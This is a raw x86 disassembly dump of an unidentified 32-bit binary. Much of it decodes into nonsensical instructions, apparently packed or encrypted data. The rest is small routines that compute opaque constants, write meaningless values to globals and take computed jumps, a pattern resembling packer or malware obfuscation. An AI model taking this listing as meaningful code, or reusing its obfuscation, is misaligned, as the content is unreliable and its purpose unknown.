  415713:	and    esi,edi
  415715:	and    cl,BYTE PTR [esi-0x4f]
  415718:	int    0x56
  41571a:	js     0x4156d8
  41571c:	push   ebp
  41571d:	inc    esp
  41571e:	jg     0x41572e
  415720:	dec    ebx
  415721:	and    bh,al
  415723:	mov    ah,0x93
  415725:	imul   esp,DWORD PTR [edi],0xd39b5cc9
  41572b:	icebp  
  41572c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41572d:	sar    DWORD PTR [edx],0x59
  415730:	adc    esi,esi
  415732:	iret   
  415733:	rcr    BYTE PTR [edx-0x47],1
  415736:	in     al,0xd
  415738:	popa   
  415739:	cli    
  41573a:	pop    es
  41573b:	dec    esp
  41573c:	lods   al,BYTE PTR ds:[esi]
  41573d:	stos   DWORD PTR es:[edi],eax
  41573e:	jae    0x415785
  415740:	mov    ah,0xb7
  415742:	mov    WORD PTR [eax],gs
  415744:	lods   al,BYTE PTR ds:[esi]
  415745:	mov    al,0xb1
  415747:	xor    ecx,edi
  415749:	dec    esi
  41574a:	mov    dh,0xbc
  41574c:	(bad)  
  41574d:	mov    bl,bl
  41574f:	pop    ecx
  415750:	loopne 0x41577d
  415752:	pop    eax
  415753:	sbb    dl,bl
  415755:	mov    esi,0xbd2c902b
  41575a:	call   0x5f70:0x9a681143
  415761:	pusha  
  415762:	jl     0x4156f8
  415764:	fdiv   QWORD PTR [edi]
  415766:	lods   eax,DWORD PTR ds:[esi]
  415767:	cmp    edx,DWORD PTR [ebx+0x6fc0c9bc]
  41576d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41576e:	call   0x1441e313
  415773:	(bad)  
  415774:	push   cs
  415775:	or     dl,cl
  415777:	and    cl,dl
  415779:	sbb    DWORD PTR [edi+0x6d],esi
  41577c:	das    
  41577d:	pop    es
  41577e:	sub    BYTE PTR [ecx-0x4],bl
  415781:	stc    
  415782:	arpl   sp,bp
  415784:	mov    eax,0xc3e75dbf
  415789:	(bad)  
  41578a:	outs   dx,DWORD PTR ds:[esi]
  41578b:	les    esi,FWORD PTR [esi+0x72bf490b]
  415791:	push   ss
  415792:	mov    dl,0xf2
  415794:	lea    ebp,[ebp+0x60]
  415797:	push   ecx
  415798:	jne    0x4157a8
  41579a:	mov    BYTE PTR [edi-0x7a98dfa9],dh
  4157a0:	ja     0x415782
  4157a2:	dec    ebx
  4157a3:	mov    ch,0x56
  4157a5:	rcl    BYTE PTR [eax+0x1973fbd9],cl
  4157ab:	pop    esp
  4157ac:	xchg   ecx,eax
  4157ad:	xchg   edx,eax
  4157ae:	test   DWORD PTR [edx],esi
  4157b0:	jae    0x4157bf
  4157b2:	aas    
  4157b3:	pop    es
  4157b4:	pop    ebp
  4157b5:	mov    ah,BYTE PTR [eax]
  4157b7:	mov    ebp,0xcbda6391
  4157bc:	mov    gs,ebp
  4157be:	retf   0xc074
  4157c1:	push   0x26
  4157c3:	jg     0x415761
  4157c5:	xchg   dl,al
  4157c7:	aam    0xe5
  4157c9:	pop    eax
  4157ca:	(bad)  
  4157cb:	mov    WORD PTR [ecx+0x5f],gs
  4157ce:	xchg   edi,eax
  4157cf:	sbb    edi,0x38
  4157d2:	aas    
  4157d3:	pusha  
  4157d4:	nop
  4157d5:	ret    
  4157d6:	push   ds
  4157d7:	jg     0x41575d
  4157d9:	fistp  WORD PTR [edx]
  4157db:	fwait
  4157dc:	push   edx
  4157dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157de:	cmp    cl,0xbc
  4157e1:	adc    eax,0x4ac2d55b
  4157e6:	ins    DWORD PTR es:[edi],dx
  4157e7:	(bad)  
  4157e8:	push   0x10
  4157ea:	cmc    
  4157eb:	adc    BYTE PTR [ebx-0x24],0x9a
  4157ef:	(bad)  
  4157f0:	data16 xor al,0x3b
  4157f3:	xor    edx,DWORD PTR [esi]
  4157f5:	push   ebp
  4157f6:	inc    edi
  4157f7:	jne    0x415823
  4157f9:	retf   0xadf
  4157fc:	xchg   DWORD PTR [ecx+0x5d],esi
  4157ff:	stos   DWORD PTR es:[edi],eax
  415800:	cli    
  415801:	mov    edx,0xd14b84a3
  415806:	and    DWORD PTR [eax],esp
  415808:	shl    DWORD PTR [edx+0x5bd75e3c],0xd7
  41580f:	fwait
  415810:	sub    BYTE PTR [ebp-0x76],ah
  415813:	dec    ebx
  415814:	sbb    al,0xff
  415816:	cmp    BYTE PTR [ecx],0x17
  415819:	add    al,0x90
  41581b:	sbb    dl,cl
  41581d:	push   eax
  41581e:	push   eax
  41581f:	test   eax,0x2421649f
  415824:	repnz not BYTE PTR [ebp-0x1b]
  415828:	lods   al,BYTE PTR ds:[esi]
  415829:	lods   eax,DWORD PTR ds:[esi]
  41582a:	sbb    ch,cl
  41582c:	pop    esi
  41582d:	test   eax,0xa972d2fa
  415832:	ss pop ebp
  415834:	mov    cl,0xf5
  415836:	inc    edx
  415837:	inc    esp
  415838:	out    dx,eax
  415839:	mov    al,BYTE PTR [edi-0x193bd56b]
  41583f:	mov    bh,ch
  415841:	ret    0x4d3d
  415844:	pop    ebx
  415845:	or     al,0x52
  415847:	rcl    BYTE PTR [ebx],cl
  415849:	aas    
  41584a:	dec    ecx
  41584b:	lea    edi,[ebx]
  41584d:	mov    esp,0x43554cf2
  415852:	es adc ah,al
  415855:	(bad)  ds:0x3a0ee364
  41585b:	cmp    dh,ch
  41585d:	inc    eax
  41585e:	hlt    
  41585f:	jg     0x415888
  415861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415862:	jno    0x415877
  415864:	push   ss
  415865:	add    ah,al
  415867:	stos   DWORD PTR es:[edi],eax
  415868:	ins    DWORD PTR es:[edi],dx
  415869:	and    al,0x52
  41586b:	push   ecx
  41586c:	add    BYTE PTR [ebx+0x2f],cl
  41586f:	xor    DWORD PTR [ebx],0xfffffff9
  415872:	xchg   edx,eax
  415873:	adc    BYTE PTR [esp+eiz*2-0x75],dl
  415877:	push   ds
  415878:	push   ebp
  415879:	push   cs
  41587a:	cwde   
  41587b:	xchg   ebp,eax
  41587c:	pop    ebp
  41587d:	cmp    ecx,esp
  41587f:	addr16 or bh,cl
  415882:	mov    bh,0x65
  415884:	jg     0x4158de
  415886:	jmp    0x1eeb:0x84a60355
  41588d:	push   edx
  41588e:	ror    DWORD PTR [edx+0x4e4af46b],1
  415894:	pop    ss
  415895:	and    al,0x1e
  415897:	and    DWORD PTR [eax-0x4563d317],edi
  41589d:	fcom   st(6)
  41589f:	(bad)  
  4158a0:	mov    al,ah
  4158a2:	fnstsw WORD PTR [ecx+0x76d8ac81]
  4158a8:	es or  eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x4284c5,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428561,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x428435,0x0
  41597d:	mov    DWORD PTR ds:0x428555,0x1bde
  415987:	mov    DWORD PTR ds:0x428479,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428581,ebx
  4159a1:	cmp    DWORD PTR ds:0x428435,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x4284c5,0x428409
  4159c1:	sub    DWORD PTR ds:0x42843d,0x4284f9
  4159cb:	and    DWORD PTR ds:0x428455,edi
  4159d1:	mov    DWORD PTR ds:0x42846d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x4284dd,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0x3ea779cf
  415b02:	fstp   QWORD PTR [esp+edi*4-0x3b714142]
  415b09:	mov    esi,0xcc5166be
  415b0e:	mov    dh,dh
  415b10:	data16 repnz shr BYTE PTR [edi-0x6e46232b],1
  415b18:	jl     0x415b5e
  415b1a:	mov    edi,0x62fa4ba
  415b1f:	pusha  
  415b20:	add    eax,ebx
  415b22:	or     ah,BYTE PTR [edx]
  415b24:	adc    edi,DWORD PTR [edx+0x5569db91]
  415b2a:	cmp    eax,DWORD PTR ds:0xcbe29ad
  415b30:	scas   al,BYTE PTR es:[edi]
  415b31:	iret   
  415b32:	addr16 pop esp
  415b34:	xchg   DWORD PTR [ebx],ebx
  415b36:	sbb    DWORD PTR [esi-0x1cbe8674],ebx
  415b3c:	icebp  
  415b3d:	add    BYTE PTR [edi-0x590c0832],al
  415b43:	mov    dl,BYTE PTR [eax]
  415b45:	add    al,BYTE PTR [ebp+0x60]
  415b48:	in     eax,dx
  415b49:	aaa    
  415b4a:	mov    cl,0xf4
  415b4c:	lods   al,BYTE PTR ds:[esi]
  415b4d:	outs   dx,DWORD PTR ds:[esi]
  415b4e:	xchg   ebx,eax
  415b4f:	pushf  
  415b50:	adc    al,0x94
  415b52:	and    al,dh
  415b54:	add    BYTE PTR [ebx+0x46],dh
  415b57:	sbb    al,0xe2
  415b59:	(bad)  
  415b5a:	pop    ss
  415b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5c:	xchg   edx,eax
  415b5d:	cmp    edx,DWORD PTR [eax+0x32079f1]
  415b63:	or     DWORD PTR [eax+0x7862bad1],ecx
  415b69:	pop    esp
  415b6a:	pop    ss
  415b6b:	push   0x55
  415b6d:	xor    eax,0x28de1c27
  415b72:	sbb    ch,BYTE PTR [ecx]
  415b74:	aam    0x79
  415b76:	sahf   
  415b77:	pop    eax
  415b78:	xchg   ecx,eax
  415b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b7a:	push   0xffffffa3
  415b7c:	leave  
  415b7d:	mov    ebx,0x272c918e
  415b82:	xor    ecx,esp
  415b84:	sbb    dl,BYTE PTR [edx+0x42]
  415b87:	xchg   edi,eax
  415b88:	int3   
  415b89:	inc    ebp
  415b8a:	aaa    
  415b8b:	rcr    DWORD PTR [esi],1
  415b8d:	sub    eax,0xe38187fe
  415b92:	retf   
  415b93:	xor    dl,dl
  415b95:	fwait
  415b96:	in     eax,0xb1
  415b98:	mov    eax,ds:0x2c969481
  415b9d:	and    dl,BYTE PTR [eax]
  415b9f:	or     dl,BYTE PTR [ecx+esi*1+0x32]
  415ba3:	mul    DWORD PTR ds:0xe64fa99b
  415ba9:	adc    ebp,edx
  415bab:	mov    ds:0x2e62b0c,eax
  415bb0:	hlt    
  415bb1:	mov    ebx,0x9868c443
  415bb6:	jns    0x415b51
  415bb8:	enter  0x3726,0x39
  415bbc:	or     bl,BYTE PTR [ebp+0xddb212]
  415bc2:	dec    ecx
  415bc3:	stos   DWORD PTR es:[edi],eax
  415bc4:	mov    ebp,0xd0434cb
  415bc9:	das    
  415bca:	dec    eax
  415bcb:	cmp    ebx,0xffffff97
  415bce:	test   ax,0xd894
  415bd2:	jnp    0x415b8d
  415bd4:	(bad)  
  415bd5:	fist   DWORD PTR [ecx+ebp*2+0xb]
  415bd9:	aas    
  415bda:	xchg   edi,eax
  415bdb:	loopne 0x415c5a
  415bdd:	out    dx,al
  415bde:	dec    edi
  415bdf:	mov    ds:0xc55586cb,eax
  415be4:	lods   eax,DWORD PTR ds:[esi]
  415be5:	add    ch,ch
  415be7:	add    dl,BYTE PTR [ebx-0x60]
  415bea:	mov    bl,0x11
  415bec:	int3   
  415bed:	or     dl,BYTE PTR [edx]
  415bef:	cli    
  415bf0:	or     BYTE PTR [edx],0x2
  415bf3:	in     al,0x4c
  415bf5:	xchg   ebx,eax
  415bf6:	add    ah,BYTE PTR [ebx]
  415bf8:	mov    ebx,0x34e64801
  415bfd:	fwait
  415bfe:	mov    eax,ds:0x1b4b443a
  415c03:	test   eax,0x879d988f
  415c08:	add    bh,BYTE PTR [ebp+0x75]
  415c0b:	lea    eax,[eax-0x425877b0]
  415c11:	test   ebx,ecx
  415c13:	add    DWORD PTR [ebx],edx
  415c15:	in     al,0x70
  415c17:	jbe    0x415ba2
  415c19:	ins    DWORD PTR es:[edi],dx
  415c1a:	inc    ebx
  415c1b:	sub    al,ah
  415c1d:	arpl   WORD PTR [edi-0x74107fdf],di
  415c23:	jnp    0x415c4b
  415c25:	sub    bl,BYTE PTR [ebx-0x4a41b7d5]
  415c2b:	jmp    0x6e4b:0x8447c359
  415c32:	popa   
  415c33:	mov    edx,0x3951b39e
  415c38:	nop
  415c39:	stc    
  415c3a:	xor    al,0x26
  415c3c:	rcl    ebp,cl
  415c3e:	xchg   esp,eax
  415c3f:	shl    BYTE PTR gs:[esi-0x3d012a9f],0xfd
  415c47:	cmp    BYTE PTR [edi],al
  415c49:	or     cl,cl
  415c4b:	sub    BYTE PTR [ecx+edx*1],dl
  415c4e:	or     BYTE PTR [ebp-0x79a15f97],ah
  415c54:	xchg   ebx,eax
  415c55:	sbb    DWORD PTR [esi],eax
  415c57:	adc    BYTE PTR [eax],dl
  415c59:	jne    0x415ccf
  415c5b:	add    DWORD PTR [ebp-0x3b03fd97],edi
  415c61:	jb     0x415ca8
  415c63:	test   DWORD PTR [edi+0x75d24d62],edx
  415c69:	cmp    eax,0x58011c9f
  415c6e:	and    BYTE PTR [eax+0xabe6621],0x89
  415c75:	aad    0xee
  415c77:	push   edi
  415c78:	mov    edx,0x3a4b6fa3
  415c7d:	xlat   BYTE PTR ds:[ebx]
  415c7e:	pop    ebp
  415c7f:	add    al,0x5c
  415c81:	jb     0x415cf9
  415c83:	mov    dh,ah
  415c85:	xor    DWORD PTR [edi+0x3b],edi
  415c88:	jmp    0x82de664b
  415c8d:	adc    ecx,edi
  415c8f:	rcl    DWORD PTR [ebp-0x56],cl
  415c92:	cmp    eax,DWORD PTR [ecx]
  415c94:	jo     0x415cb8
  415c96:	pop    es
  415c97:	push   eax
  415c98:	dec    esp
  415c99:	add    al,BYTE PTR [edi]
  415c9b:	push   esp
  415c9c:	cli    
  415c9d:	jbe    0x415c86
  415c9f:	pusha  
  415ca0:	sbb    DWORD PTR [edx+0x2d],ebp
  415ca3:	fimul  DWORD PTR [eax+0x23]
  415ca6:	stos   BYTE PTR es:[edi],al
  415ca7:	pop    edx
  415ca8:	js     0x415c82
  415caa:	loope  0x415cf8
  415cac:	hlt    
  415cad:	je     0x415c9b
  415caf:	mov    dl,0xab
  415cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb2:	enter  0xfb58,0x1c
  415cb6:	push   esp
  415cb7:	dec    ebx
  415cb8:	rcl    BYTE PTR [edi+eiz*1-0x1dd84d0f],1
  415cbf:	mov    edx,0x2864dba7
  415cc4:	jne    0x415cd6
  415cc6:	mov    bh,0xb1
  415cc8:	mov    bl,0x97
  415cca:	pop    eax
  415ccb:	popa   
  415ccc:	jg     0x415cfa
  415cce:	sbb    cl,BYTE PTR [eax]
  415cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd1:	pop    ecx
  415cd2:	sar    DWORD PTR [esi],cl
  415cd4:	enter  0xb63a,0x22
  415cd8:	xor    dh,BYTE PTR [edx+0x781ab58]
  415cde:	ret    0x7639
  415ce1:	cmp    BYTE PTR [ebx-0x36],ah
  415ce4:	into   
  415ce5:	pop    ss
  415ce6:	cmp    dl,dh
  415ce8:	jo     0x415cf0
  415cea:	cs ja  0x415ceb
  415ced:	pop    eax
  415cee:	dec    edx
  415cef:	sbb    cl,BYTE PTR [ecx+0x488186dc]
  415cf5:	aad    0x28
  415cf7:	shl    BYTE PTR [ebx-0x50],cl
  415cfa:	sbb    eax,0xbdd70a9d
  415cff:	clc    
  415d00:	inc    ebp
  415d01:	je     0x415cbe
  415d03:	jae    0x415d37
  415d05:	das    
  415d06:	ins    DWORD PTR es:[edi],dx
  415d07:	mov    DWORD PTR [ecx],esp
  415d09:	inc    eax
  415d0a:	jecxz  0x415ce5
  415d0c:	inc    eax
  415d0d:	or     ebx,eax
  415d0f:	cmp    ch,cl
  415d11:	dec    eax
  415d12:	out    0x8d,al
  415d14:	ret    
  415d15:	push   ds
  415d16:	in     eax,0xed
  415d18:	xchg   edi,eax
  415d19:	and    BYTE PTR [ebp-0x4],bl
  415d1c:	lock xchg edx,eax
  415d1e:	pop    ss
  415d1f:	mov    eax,ds:0xd0067f1e
  415d24:	shl    al,cl
  415d26:	xchg   DWORD PTR [ebx+0x61975b3e],esp
  415d2c:	ins    DWORD PTR es:[edi],dx
  415d2d:	pop    ebp
  415d2e:	bound  eax,QWORD PTR [ebx-0x4b]
  415d31:	sub    BYTE PTR [edi+0x60],0x2c
  415d35:	dec    ebp
  415d36:	cmp    DWORD PTR [eax],edi
  415d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d39:	xchg   esp,eax
  415d3a:	sbb    eax,0x6eec1720
  415d3f:	add    eax,0xc2a0b5de
  415d44:	xor    al,0x41
  415d46:	out    0x62,al
  415d48:	les    edi,FWORD PTR [esi+0x79f2eaa3]
  415d4e:	mov    edi,0x21b4cd2f
  415d53:	cli    
  415d54:	(bad)  
  415d56:	call   0xbeb3337f
  415d5b:	xchg   edx,eax
  415d5c:	ins    DWORD PTR es:[edi],dx
  415d5d:	scas   al,BYTE PTR es:[edi]
  415d5e:	ret    0x3602
  415d61:	sub    DWORD PTR ds:0x94d07fd2,eax
  415d67:	(bad)  
  415d68:	mov    eax,ds:0xc2a1278b
  415d6d:	mov    dl,0x97
  415d6f:	ss sahf 
  415d71:	loopne 0x415d85
  415d73:	lods   eax,DWORD PTR ds:[esi]
  415d74:	adc    eax,0xb29949a
  415d79:	sar    BYTE PTR [ebp+0x6ce8a1ee],1
  415d7f:	pop    es
  415d80:	pop    ds
  415d81:	sbb    BYTE PTR [esi+0x30f61847],ah
  415d87:	cwde   
  415d88:	push   es
  415d89:	fcom   st(0)
  415d8b:	les    edx,FWORD PTR [ebp-0x34fbfc31]
  415d91:	lahf   
  415d92:	adc    eax,0xfdcd23bc
  415d97:	mov    eax,0xa6d61bbb
  415d9c:	imul   ebx,DWORD PTR cs:[ebp+0x34],0x79
  415da1:	xor    BYTE PTR [esi-0x70],ch
  415da4:	mov    esp,0x798efe62
  415da9:	mov    ecx,0x53533641
  415dae:	push   ebx
  415daf:	mov    ebp,0xad913967
  415db4:	mov    fs,ebx
  415db6:	dec    edx
  415db7:	fst    QWORD PTR [ecx+0x79d3e847]
  415dbd:	pop    esi
  415dbe:	and    bl,BYTE PTR [edx]
  415dc0:	cmp    DWORD PTR [edx+0x6c],eax
  415dc3:	imul   ecx,eax,0xb1a3b535
  415dc9:	jge    0x415df1
  415dcb:	mov    BYTE PTR [edi+ebp*8-0x757528c3],bh
  415dd2:	int3   
  415dd3:	addr16 sub al,0xa0
  415dd7:	leave  
  415dd8:	test   DWORD PTR [ebp+0x72037023],0xfb5958bb
  415de2:	push   eax
  415de3:	add    BYTE PTR ds:0xb7402ba4,cl
  415de9:	es das 
  415deb:	or     edx,ebp
  415ded:	(bad)  [edx]
  415def:	in     al,dx
  415df0:	xchg   edx,eax
  415df1:	inc    edi
  415df2:	js     0x415e04
  415df4:	jge    0x415e54
  415df6:	xor    dh,ch
  415df8:	loope  0x415e27
  415dfa:	pop    esi
  415dfb:	outs   dx,BYTE PTR ds:[esi]
  415dfc:	jp     0x415e2e
  415dfe:	not    DWORD PTR [ecx+0x61]
  415e01:	bswap  esp
  415e03:	xchg   edx,eax
  415e04:	dec    edx
  415e05:	inc    ebp
  415e06:	pop    ecx
  415e07:	add    BYTE PTR [ebx-0x2],cl
  415e0a:	xchg   esi,eax
  415e0b:	jmp    0xc36884e3
  415e10:	arpl   WORD PTR [ebx],dx
  415e12:	cwde   
  415e13:	add    eax,0x85c42d9d
  415e18:	or     bh,BYTE PTR [edx-0x4dc48851]
  415e1e:	out    0x72,al
  415e20:	imul   edi,DWORD PTR [edi+0xf70eff3],0x8954ef02
  415e2a:	mov    bl,0x67
  415e2c:	jno    0x415e5e
  415e2e:	mov    ah,0x2a
  415e30:	seta   BYTE PTR [edx]
  415e33:	add    eax,0xa808d14a
  415e38:	idiv   ebp
  415e3a:	or     eax,0x41265a9f
  415e3f:	(bad)  
  415e40:	push   ebx
  415e41:	nop
  415e42:	fcom   QWORD PTR [ebx]
  415e44:	outs   dx,BYTE PTR gs:[esi]
  415e46:	mov    dl,0x87
  415e48:	outs   dx,BYTE PTR ds:[esi]
  415e49:	push   ebx
  415e4a:	jns    0x415df0
  415e4c:	cmp    DWORD PTR [esi+0x78],esi
  415e4f:	cld    
  415e50:	mov    dl,0x25
  415e52:	jl     0x415e3e
  415e54:	(bad)  
  415e55:	sbb    ebp,DWORD PTR [eax+0x26]
  415e58:	cld    
  415e59:	xor    DWORD PTR [edx+edi*2+0x13],ecx
  415e5d:	lods   al,BYTE PTR ds:[esi]
  415e5e:	fwait
  415e5f:	adc    dl,bl
  415e61:	adc    eax,0x4871564e
  415e67:	pusha  
  415e68:	push   esi
  415e69:	xchg   BYTE PTR [ebp-0x2dce2aaa],al
  415e6f:	leave  
  415e70:	sub    DWORD PTR [ebx+eiz*1],eax
  415e73:	daa    
  415e74:	cmp    al,0xbe
  415e76:	lods   al,BYTE PTR ds:[esi]
  415e77:	div    ebp
  415e79:	jns    0x415ed4
  415e7b:	retf   0xe2fd
  415e7e:	adc    eax,0xc54c0cd8
  415e83:	lea    ebp,[esi+0x5aa501fa]
  415e89:	ret    0x45be
  415e8c:	cmp    al,0x41
  415e8e:	pop    ebx
  415e8f:	ds cld 
  415e91:	fsub   QWORD PTR [edi+0x5d]
  415e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e95:	jl     0x415ee5
  415e97:	mov    al,ds:0xfd12fc2b
  415e9c:	cdq    
  415e9d:	mov    ebp,0x75f541a1
  415ea2:	mov    esp,0x5046975b
  415ea7:	out    0xd3,eax
  415ea9:	push   es
  415eaa:	pop    ebp
  415eab:	push   cs
  415eac:	clc    
  415ead:	push   ds
  415eae:	xchg   esp,eax
  415eaf:	sti    
  415eb0:	pop    ss
  415eb1:	mov    ebp,DWORD PTR [ebx+0x499c14bd]
  415eb7:	cli    
  415eb8:	sbb    DWORD PTR [ecx+eax*8],ecx
  415ebb:	loope  0x415ebe
  415ebd:	and    esp,DWORD PTR ds:[eax-0x4c]
  415ec1:	sar    DWORD PTR [ecx+ecx*2],0x6
  415ec5:	push   esi
  415ec6:	test   al,0x93
  415ec8:	les    ebp,FWORD PTR [esi-0x5f72f46b]
  415ece:	jns    0x415e9d
  415ed0:	leave  
  415ed1:	pop    eax
  415ed2:	sahf   
  415ed3:	xlat   BYTE PTR ds:[ebx]
  415ed4:	ins    BYTE PTR es:[edi],dx
  415ed5:	jle    0x415e66
  415ed7:	xchg   esp,eax
  415ed8:	jno    0x415f33
  415eda:	push   0xb56fbb27
  415edf:	repnz pop ebx
  415ee1:	inc    ebp
  415ee2:	push   edx
  415ee3:	arpl   WORD PTR [esp+ebp*4-0x3f],dx
  415ee7:	cmc    
  415ee8:	push   edx
  415ee9:	nop
  415eea:	mov    dh,0xd7
  415eec:	in     eax,dx
  415eed:	scas   al,BYTE PTR es:[edi]
  415eee:	outs   dx,BYTE PTR ds:[esi]
  415eef:	mov    ah,0x76
  415ef1:	mov    edi,0xdd0a2c32
  415ef6:	push   es
  415ef7:	sub    edx,eax
  415ef9:	cmp    ebx,edx
  415efb:	ja     0x4167d7
  415f01:	jmp    0x415f09
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0x38c4f4e3
  415f32:	xchg   edx,eax
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
